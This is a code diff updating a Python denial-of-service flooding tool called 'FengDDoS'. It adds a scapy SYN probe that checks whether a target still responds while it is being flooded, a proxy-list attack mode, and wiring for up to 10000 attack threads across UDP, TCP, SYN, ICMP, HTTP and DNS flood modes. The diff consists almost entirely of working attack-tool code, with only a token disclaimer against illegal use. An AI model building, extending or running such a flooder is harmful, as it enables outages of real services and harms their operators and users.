@@ -8,7 +8,7 @@ from datetime import datetime
 from socket import gethostbyname
 
 try:
-    from scapy.all import IP, TCP, ICMP, UDP, send, Raw
+    from scapy.all import IP, TCP, ICMP, UDP, send, sr1, Raw
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
@@ -55,7 +55,7 @@ class AttackStats:
 
     def get_qps(self):
         elapsed = self.get_elapsed()
-        if elapsed > 0:
+        if elapsed > 1:
             return self.get_sent() / elapsed
         return 0
 
@@ -70,48 +70,83 @@ stats = AttackStats()
 
 def show_banner():
     os.system("clear")
-    os.system("figlet FengAK")
+    os.system("figlet FengDDoS")
     print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
     print(f"{color.BOLD} Author :{color.RESET} FengPwner")
     print(f"{color.BOLD} Github :{color.RESET} https://github.com/FengPwner")
     print(f"{color.BOLD} Atomgit:{color.RESET} https://atomgit.com/FengPwner")
     print(f"{color.BOLD} CSDN   :{color.RESET} https://blog.csdn.net/2302_76189356")
-    print(f"{color.BOLD} Version:{color.RESET} S1.3")
+    print(f"{color.BOLD} Version:{color.RESET} S1.4")
     print(f"{color.YELLOW}---------------------------------------------------{color.RESET}")
     print(f"{color.RED}{color.BOLD} [!] Do not use for illegal purposes!{color.RESET}\n")
 
-def check_connectivity(target_ip, target_port, interval=10):
+def verify_packets(target_ip, target_port, interval=10):
     while stats.running:
         status = "UNKNOWN"
-        latency = None
-        err_detail = ""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
-            start = time.time()
-            s.connect((target_ip, target_port))
-            latency = (time.time() - start) * 1000
-            status = "ALIVE"
-            s.close()
-        except ConnectionRefusedError:
-            status = "REFUSED"
-            err_detail = "目标端口拒绝连接"
-        except socket.timeout:
-            status = "TIMEOUT"
-            err_detail = "连接超时"
-        except OSError as e:
-            status = "ERROR"
-            err_detail = str(e)
-        except Exception as e:
-            status = "ERROR"
-            err_detail = str(e)
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        if latency is not None:
-            print(f"\n{color.GREEN}[{timestamp}] [Connectivity] {target_ip}:{target_port} -> {status} (RTT: {latency:.1f} ms){color.RESET}")
+        detail = ""
+        if SCAPY_AVAILABLE:
+            try:
+                src_port = random.randint(1024, 65535)
+                pkt = IP(dst=target_ip) / TCP(dport=target_port, sport=src_port, flags="S")
+                resp = sr1(pkt, timeout=3, verbose=False)
+                if resp is None:
+                    status = "NO_REPLY"
+                    detail = "no response, may be filtered or dropped"
+                elif resp.haslayer(TCP):
+                    flags = resp[TCP].flags
+                    if flags & 0x12:
+                        status = "REACHED"
+                        detail = "SYN+ACK received, port open"
+                    elif flags & 0x14:
+                        status = "REACHED"
+                        detail = "RST received, port closed but host reachable"
+                    else:
+                        status = "REPLIED"
+                        detail = f"TCP flags: {flags}"
+                elif resp.haslayer(ICMP):
+                    icmp_type = resp[ICMP].type
+                    if icmp_type == 3:
+                        status = "REACHED"
+                        detail = "ICMP dest unreachable, host reachable"
+                    else:
+                        status = "ICMP"
+                        detail = f"ICMP type {icmp_type}"
+                else:
+                    status = "REPLIED"
+                    detail = str(resp.summary())
+            except Exception as e:
+                status = "ERROR"
+                detail = str(e)
         else:
-            print(f"\n{color.RED}[{timestamp}] [Connectivity] {target_ip}:{target_port} -> {status} ({err_detail}){color.RESET}")
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(3)
+                start = time.time()
+                s.connect((target_ip, target_port))
+                latency = (time.time() - start) * 1000
+                status = "REACHED"
+                detail = f"TCP connected ({latency:.1f} ms)"
+                s.close()
+            except ConnectionRefusedError:
+                status = "REACHED"
+                detail = "connection refused, host reachable"
+            except socket.timeout:
+                status = "NO_REPLY"
+                detail = "connection timed out"
+            except OSError as e:
+                status = "ERROR"
+                detail = str(e)
+            except Exception as e:
+                status = "ERROR"
+                detail = str(e)
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        if status in ("REACHED", "REPLIED"):
+            print(f"\n{color.GREEN}[{timestamp}] [Verify] {target_ip}:{target_port} -> {status} ({detail}){color.RESET}")
+        elif status == "NO_REPLY":
+            print(f"\n{color.YELLOW}[{timestamp}] [Verify] {target_ip}:{target_port} -> {status} ({detail}){color.RESET}")
+        else:
+            print(f"\n{color.RED}[{timestamp}] [Verify] {target_ip}:{target_port} -> {status} ({detail}){color.RESET}")
         time.sleep(interval)
-
 
 def udp_flood(target_ip, target_port, packet_size):
     while stats.running:
@@ -279,16 +314,19 @@ def run_attack(target_ip, target_port, mode, packet_size, threads, proxy_list=No
     if not attack_func:
         print(f"{color.RED}[-] Unknown attack mode: {mode}{color.RESET}")
         return
+    if mode == "proxy" and not proxy_list:
+        print(f"{color.RED}[-] Proxy mode requires a non-empty proxy list. Aborting.{color.RESET}")
+        return
 
     monitor_thread = threading.Thread(target=monitor_stats, daemon=True)
     monitor_thread.start()
 
-    conn_thread = threading.Thread(target=check_connectivity, args=(target_ip, target_port, 10), daemon=True)
-    conn_thread.start()
+    verify_thread = threading.Thread(target=verify_packets, args=(target_ip, target_port, 10), daemon=True)
+    verify_thread.start()
 
     attack_threads = []
     for _ in range(threads):
-        if mode == "proxy" and proxy_list:
+        if mode == "proxy":
             t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size, proxy_list))
         else:
             t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size))
@@ -362,6 +400,14 @@ while True:
                 elif action == 'e': continue
         if mode not in ["udp","tcp","syn","icmp","http","dns","proxy"]: continue
 
+        proxy_list = None
+        if mode == "proxy":
+            proxy_file = input(f"{color.BLUE}[+] Proxy file path (ip:port per line): {color.RESET}").strip()
+            proxy_list = load_proxies(proxy_file)
+            if not proxy_list:
+                print(f"{color.RED}[-] No valid proxies loaded, falling back to tcp mode.{color.RESET}")
+                mode = "tcp"
+
         while True:
             t_input = input(f"{color.BLUE}[4/4] Threads (1~10000, type 'exit' to quit): {color.RESET}")
             if t_input.strip().lower() == 'exit':
@@ -380,8 +426,8 @@ while True:
 
         os.system("clear")
         print(f"{color.CYAN}{color.BOLD}[*] Attack started... Press Ctrl+C to stop.{color.RESET}\n")
-        print(f"{color.YELLOW}[*] Connectivity check runs every 10 seconds.{color.RESET}\n")
-        run_attack(target_ip, target_port, mode, 64, threads)
+        print(f"{color.YELLOW}[*] Packet verification runs every 10 seconds.{color.RESET}\n")
+        run_attack(target_ip, target_port, mode, 64, threads, proxy_list)
         handle_error(allow_edit=False)
     except Exception as e:
         print(f"{color.RED}[!] Error: {e}{color.RESET}")
